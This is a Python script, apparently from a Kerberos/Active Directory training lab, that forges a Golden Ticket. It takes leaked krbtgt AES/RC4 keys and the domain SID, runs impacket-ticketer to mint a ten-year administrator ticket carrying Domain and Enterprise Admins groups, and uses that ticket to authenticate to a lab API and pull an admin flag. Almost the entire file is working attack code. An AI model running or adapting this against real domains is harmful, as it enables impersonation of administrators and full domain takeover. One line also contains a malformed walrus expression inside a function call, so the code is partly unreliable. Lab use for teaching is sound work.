#!/usr/bin/env python3
"""
Educational Golden Ticket Demonstration Script
CSATTT Lab - Kerberos / Active Directory
Forges a Golden Ticket using compromised krbtgt material and bypasses authentication.
"""
import os
import sys
import json
import shutil
import base64
import subprocess
import requests
import spnego
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

DOMAIN_INFO_FILE = "/shared/domain_info.json"
SHARED_CCACHE = "/shared/golden.ccache"
API_URL = os.getenv("API_URL", "http://api.lab.local:8000")
SERVICE_SPN = "HTTP/api.lab.local"

def load_domain_info():
    if not os.path.exists(DOMAIN_INFO_FILE):
        console.print(f"[bold red][-] Domain metadata not found at {DOMAIN_INFO_FILE}.[/]")
        console.print("[dim]Vui lòng đợi Samba AD DC khởi tạo xong...[/dim]")
        return None
    with open(DOMAIN_INFO_FILE, "r") as f:
        return json.load(f)

def forge_golden_ticket(info: dict, target_user: str = "administrator") -> str:
    domain_name = info.get("realm", "LAB.LOCAL")
    domain_sid = info.get("domain_sid", "")
    krbtgt_keys = info.get("krbtgt_keys", {})
    aes256_key = krbtgt_keys.get("aes256", "")
    rc4_key = krbtgt_keys.get("rc4", "")

    console.print(Panel(
        f"[bold yellow]THU THẬP THÔNG TIN MÔI TRƯỜNG TỪ LEAK / DUMP:[/]\n"
        f"  • Domain FQDN  : [cyan]{domain_name}[/]\n"
        f"  • Domain SID   : [cyan]{domain_sid}[/]\n"
        f"  • Target User  : [bold red]{target_user}[/] (RID 500 - Domain Administrator)\n"
        f"  • Target Groups: [bold red]512[/] (Domain Admins), [bold red]519[/] (Enterprise Admins)\n"
        f"  • Ticket Expiry: [bold red]10 năm (87600 giờ)[/] [dim](Mặc định AD chỉ 10h)[/]\n"
        f"  • krbtgt AES256: [green]{aes256_key[:10]}...{aes256_key[-10:] if aes256_key else 'N/A'}[/]\n"
        f"  • krbtgt RC4   : [green]{rc4_key if rc4_key else 'N/A'}[/]",
        title="[bold red]Bước 1: Khai thác bí mật krbtgt[/]",
        style="red"
    ))

    # Determine command to run impacket ticketer
    ticketer_cmd = None
    for candidate in ["impacket-ticketer", "ticketer.py"]:
        if shutil.which(candidate):
            ticketer_cmd = candidate
            break

    if not ticketer_cmd:
        ticketer_cmd = "impacket-ticketer"

    # Prefer AES256 key if available, fallback to nthash (RC4)
    cmd = [
        ticketer_cmd,
        "-domain-sid", domain_sid,
        "-domain", domain_name,
        "-user-id", "500",
        "-groups", "512,519,518,513",
        "-duration", "87600"
    ]

    if aes256_key:
        cmd.extend(["-aesKey", aes256_key])
    elif rc4_key:
        cmd.extend(["-nthash", rc4_key])
    else:
        console.print("[bold red][-] Không tìm thấy key mã hóa nào của krbtgt![/]")
        return None

    cmd.append(target_user)

    console.print(f"[bold cyan][*] Thực thi công cụ rèn vé (Forging Ticket)...[/]")
    console.print(f"    [dim]Command: {' '.join(cmd)}[/dim]")

    res = subprocess.run(cmd, capture_output=True, text=True)
    if res.returncode != 0:
        console.print(f"[bold red][-] Lỗi khi chạy ticketer:[/] {res.stderr.strip()}")
        # Retry with nthash if aes failed or vice versa
        if aes256_key and rc4_key:
            console.print("[yellow][*] Thử lại với NTLM hash (RC4)...[/]")
            cmd_rc4 = [
                ticketer_cmd,
                "-domain-sid", domain_sid,
                "-domain", domain_name,
                "-user-id", "500",
                "-groups", "512,519,518,513",
                "-duration", "87600",
                "-nthash", rc4_key,
                target_user
            ]
            res2 = subprocess.run(cmd_rc4, capture_output=True, text=True)
            if res2.returncode != 0:
                console.print(f"[bold red][-] Thử lại thất bại:[/] {res2.stderr.strip()}")
                return None

    out_ccache = f"{target_user}.ccache"
    if os.path.exists(out_ccache):
        shutil.copyfile(out_ccache, SHACCACHE := SHARED_CCACHE)
        shutil.copyfile(out_ccache, f"/tmp/{target_user}.ccache")
        console.print(f"[bold green][+] RÈN VÉ THÀNH CÔNG! Đã xuất vé ra {SHARED_CCACHE}[/]")
        return SHARED_CCACHE
    return None

def attack_with_golden_ticket(ccache_path: str):
    console.print(Panel(
        f"[bold yellow]SỬ DỤNG VÉ GIẢ MẠO ĐỂ ĐÁNH LỪA KDC VÀ DỊCH VỤ:[/]\n"
        f"  1. Gán biến môi trường [cyan]KRB5CCNAME={ccache_path}[/]\n"
        f"  2. Attacker gửi Forged TGT đến KDC xin vé dịch vụ cho [cyan]{SERVICE_SPN}[/]\n"
        f"  3. Do vé được mã hóa bằng chính key của [red]krbtgt[/], KDC tin tưởng tuyệt đối!\n"
        f"  4. KDC cấp Service Ticket cho 'administrator' với quyền Domain Admins!\n"
        f"  5. Gửi Service Ticket đến API Server để lấy cờ quản trị.",
        title="[bold red]Bước 2: Thực thi tấn công xác thực[/]",
        style="red"
    ))

    os.environ["KRB5CCNAME"] = ccache_path
    os.environ["KRB5_CONFIG"] = "/etc/krb5.conf"

    # Step 1: Query /api/whoami
    console.print("[*] Gửi AP-REQ tới [yellow]/api/whoami[/]...")
    try:
        import gssapi
        target_name = gssapi.Name(f"{SERVICE_SPN}@LAB.LOCAL", gssapi.NameType.kerberos_principal)
        ctx = gssapi.SecurityContext(name=target_name, usage='initiate')
        token_bytes = ctx.step()
        token_b64 = base64.b64encode(token_bytes).decode("ascii")

        headers = {"Authorization": f"Negotiate {token_b64}"}
        resp = requests.get(f"{API_URL}/api/whoami", headers=headers, timeout=5)

        table = Table(title="Kết quả xác thực /api/whoami (Mạo danh)")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="magenta")
        for k, v in resp.json().items():
            table.add_row(k, str(v))
        console.print(table)
    except Exception as e:
        console.print(f"[bold red][-] Thất bại khi gọi /api/whoami:[/] {e}")

    # Step 2: Query /api/admin/flag
    console.print("\n[*] Gửi AP-REQ tới endpoint quản trị bảo mật: [bold red]/api/admin/flag[/]...")
    try:
        import gssapi
        target_name_admin = gssapi.Name(f"{SERVICE_SPN}@LAB.LOCAL", gssapi.NameType.kerberos_principal)
        ctx_admin = gssapi.SecurityContext(name=target_name_admin, usage='initiate')
        token_admin_bytes = ctx_admin.step()
        token_admin_b64 = base64.b64encode(token_admin_bytes).decode("ascii")

        headers_admin = {"Authorization": f"Negotiate {token_admin_b64}"}
        resp_admin = requests.get(f"{API_URL}/api/admin/flag", headers=headers_admin, timeout=5)

        if resp_admin.status_code == 200:
            data = resp_admin.json()
            console.print(Panel(
                f"[bold green]🎯 TẤN CÔNG THÀNH CÔNG VƯỢT QUA TẤT CẢ LỚP BẢO VỆ![/]\n\n"
                f"  • Principal   : [bold red]{data.get('principal')}[/]\n"
                f"  • User RID    : [cyan]{data.get('user_rid')}[/]\n"
                f"  • Groups (PAC): [cyan]{', '.join(data.get('groups', []))}[/]\n"
                f"  • FLAG        : [bold yellow on black] {data.get('flag')} [/]\n\n"
                f"[italic]Attacker đã đạt được toàn quyền Domain Administrator mà KHÔNG CẦN biết mật khẩu của Administrator![/]",
                title="[bold green]🏆 PWNED - DOMAIN COMPROMISED[/]",
                style="bold green"
            ))
        else:
            console.print(f"[bold red][-] Từ chối truy cập (HTTP {resp_admin.status_code}):[/] {resp_admin.text}")
    except Exception as e:
        console.print(f"[bold red][-] Thất bại khi gọi /api/admin/flag:[/] {e}")

def main():
    info = load_domain_info()
    if not info:
        sys.exit(1)

    ccache = forge_golden_ticket(info, "administrator")
    if ccache:
        attack_with_golden_ticket(ccache)

if __name__ == "__main__":
    main()
